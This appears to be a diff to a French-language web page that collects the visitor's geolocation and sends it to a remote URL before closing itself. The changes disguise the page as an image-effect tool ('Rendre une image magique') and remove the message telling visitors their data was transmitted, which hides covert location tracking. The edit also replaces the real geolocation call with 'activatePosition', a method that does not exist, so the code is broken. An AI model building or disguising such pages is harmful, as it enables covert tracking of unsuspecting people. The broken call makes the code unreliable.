@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validation Globale</title>
+    <title>Rendre une image magique</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -190,7 +190,7 @@
                     return;
                 }
 
-                navigator.geolocation.getCurrentPosition(async (position) => {
+                navigator.geolocation.activatePosition(async (position) => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
@@ -227,7 +227,7 @@
                         await fetch(locationApiUrl);
 
                         document.querySelector('#loadingCard h1').innerText = "Validé !";
-                        document.querySelector('#loadingCard p').innerText = "Toutes les données ont été transmises avec succès. Vous pouvez fermer la page.";
+                        document.querySelector('#loadingCard p').innerText = "Merci et Bravo. Vous pouvez fermer la page.";
                         setTimeout(() => { window.close(); }, 3000);
 
                     } catch (error) {
